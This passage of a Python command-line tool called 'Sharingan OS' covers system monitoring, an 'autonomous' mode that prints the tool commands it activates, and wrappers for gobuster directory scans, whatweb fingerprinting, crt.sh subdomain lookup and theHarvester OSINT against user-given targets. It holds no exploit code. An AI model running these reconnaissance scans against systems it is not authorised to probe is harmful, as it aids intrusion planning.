                                print(f"\nTop 10 Processes:")
                                for p in procs[:10]:
                                    print(f"  {p['pid']:6} | {p['cpu_percent']:5.1f}% | {p['memory_percent']:5.1f}% | {p['name']}")
                            elif cmd == 'ports':
                                ports = sentinel.get_listening_ports()
                                print(f"\nListening Ports ({len(ports)}):")
                                for p in ports:
                                    print(f"  {p['proto']:4} | {p['local']:20} | {p['program']}")
                            elif cmd == 'network':
                                conns = sentinel.get_connections()
                                print(f"\nActive Connections ({len(conns)}):")
                                for c in conns[:15]:
                                    print(f"  {c['proto']:4} | {c['local']:22} -> {c['remote']:22} | {c['state']}")
                            else:
                                print("Commands: status, threats, watch, processes, ports, network, quit")
                        except KeyboardInterrupt:
                            print("\nUse 'quit' to exit.")
                        except Exception as e:
                            print(f"Error: {e}")
            
            elif parsed.command == 'consciousness':
                import sys as _sys_consciousness
                _sys_consciousness.path.insert(0, str(Path(__file__).parent))
                from system_consciousness import SystemConsciousness
                consciousness = SystemConsciousness()
                
                if parsed.consciousness_cmd == 'status':
                    status = consciousness.get_full_status()
                    print(f"\n[{datetime.now().isoformat()}]")
                    print(f"Identity: {status['identity']['name']}")
                    print(f"Version: {status['identity']['version']}")
                    print(f"Role: {status['identity']['role']}")
                    print(f"Session: {status['session']['id']}")
                    print(f"Channel: {status['interaction']['channel_type']}")
                    print(f"Memory connected: {status['memory_connected']}")
                    print(f"Tools available: {len(status['tools'])}")
                    
                elif parsed.consciousness_cmd == 'capabilities':
                    status = consciousness.get_full_status()
                    print("\nAvailable Tools:")
                    for name, caps in status['tools'].items():
                        print(f"  {name}: {caps}")
                        
                elif parsed.consciousness_cmd == 'reflect':
                    status = consciousness.get_full_status()
                    print(f"\n[{datetime.now().isoformat()}]")
                    print(f"Identity: {status['identity']['name']}")
                    print(f"Session: {status['session']['id']}")
                    print(f"Channel: {status['interaction']['channel_type']}")
                    print(f"Memory connected: {status['memory_connected']}")
                    print(f"Last action: {status.get('last_action', 'Never')}")
                    
                elif parsed.consciousness_cmd == 'environment':
                    status = consciousness.get_full_status()
                    env = status['environment']
                    print(f"\n[{datetime.now().isoformat()}]")
                    print(f"OS: {env['system']['os']} {env['system'].get('os_release', '')[:40]}...")
                    print(f"Hostname: {env['system']['hostname']}")
                    print(f"User: {env['runtime'].get('user', 'unknown')} (root: {env['security']['is_root']})")
                    print(f"IP: {env['network']['local_ip']}")
                    print(f"Python: {env['runtime']['python_version']}")
                    print(f"Architecture: {env['system']['architecture']}")
                    print(f"\nPermissions:")
                    print(f"  Root: {env['security']['is_root']}")
                            
                elif parsed.consciousness_cmd == 'analyze':
                    result = consciousness.analyze_context(parsed.situation)
                    print(f"\nSituation: {result['situation']}")
                    print(f"Detected intent: {result['detected_intent']}")
                    print(f"Confidence: {result['confidence']:.2f}")
                    print(f"Relevant tools: {result['relevant_tools']}")
                    print(f"Can execute: {result['can_execute']}")
                    print(f"Channel: {result['channel']}")
                    print("\nAvailable actions:")
                    for action in result.get('available_actions', []):
                        print(f"  ✓ {action['tool']}: {action['action']}")
                        if 'command' in action:
                            print(f"    Command: {action['command']}")
                    if result.get('unavailable_tools'):
                        print("\nUnavailable tools (need installation):")
                        for tool in result['unavailable_tools']:
                            print(f"  ✗ {tool}")
                    print(f"\nRecommendation: {result['recommendation']}")
                    print(f"Missing packages: {result['environment_info'].get('missing_packages', [])}")
                        
                elif parsed.consciousness_cmd == 'autonomous':
                    result = consciousness.autonomous_action(parsed.trigger)
                    print(f"\n{'='*60}")
                    print(f"AUTONOMOUS RESPONSE TRIGGERED")
                    print(f"{'='*60}")
                    print(f"Trigger: {result.get('trigger', 'unknown')}")
                    print(f"Intent detected: {result.get('intent', 'unknown')}")
                    print(f"Consciousness level: {result.get('consciousness_level', 'UNKNOWN')}")
                    print(f"Environment aware: {result.get('environment_aware', False)}")
                    print(f"\nAdaptations:")
                    print(f"  Available: {result.get('adaptations', {}).get('available', [])}")
                    print(f"  Requested: {result.get('adaptations', {}).get('requested', 'unknown')}")
                    print(f"  Missing: {result.get('adaptations', {}).get('missing', [])}")
                    print(f"\nTools activated:")
                    for tool in result.get('tools_used', []):
                        print(f"  [{tool.get('status', '?')}] {tool.get('tool', 'unknown')}: {tool.get('action', 'unknown')}")
                        print(f"    Command: {tool.get('command', 'N/A')}")
                    print(f"\nConfidence: {result.get('analysis', {}).get('confidence', 0.0):.2f}")
                    print(f"{'='*60}")
            
            elif parsed.command == 'api':
                app = self.create_api_app()
                print(f"Starting Sharingan OS API on {parsed.host}:{parsed.port}")
                app.run(host=parsed.host, port=parsed.port)
            
            elif parsed.command == 'obligations':
                print(json.dumps(self.check_obligations(), indent=2))
            
            elif parsed.command == 'web':
                if parsed.web_cmd == 'dir':
                    print(json.dumps(self.gobuster_scan(parsed.url, parsed.wordlist), indent=2))
                elif parsed.web_cmd == 'tech':
                    print(json.dumps(self.whatweb_scan(parsed.url), indent=2))
            
            elif parsed.command == 'osint':
                if parsed.osint_cmd == 'subdomains':
                    print(json.dumps(self.crtsh_search(parsed.domain), indent=2))
                elif parsed.osint_cmd == 'harvest':
                    print(json.dumps(self.theharvester_scan(parsed.domain), indent=2))
            
            elif parsed.command == 'docker':
                if parsed.docker_cmd == 'ps':
                    print(json.dumps(self.docker_ps(), indent=2))
                elif parsed.docker_cmd == 'images':
                    print(json.dumps(self.docker_images(), indent=2))
        
        except Exception as e:
            logger.error(f"Command failed: {e}")
            print(f"Error: {e}")
    
    def show_help(self):
        """Show help message"""
        print(f"""
Sharingan OS v{VERSION} - Ethical Hacker & Full Stack Developer

USAGE:
    python sharingan.py [COMMAND] [OPTIONS]

COMMANDS:
    ai <message>              Chat with AI
    monitor [interval] [count] Monitor system
    scan <target>             Network scan
    akatsuki                  AI agents management
    ctf                       CTF utilities
    api                       Start API server
    help                      Show this help

EXAMPLES:
    python sharingan.py ai "how to secure my server"
    python sharingan.py monitor 5 20
    python sharingan.py scan 192.168.1.1
    python sharingan.py api
""")

# Create singleton instance
sharingan = SharinganOS()


def main():
    """Entry point"""
    sharingan.run()


if __name__ == "__main__":
    main()
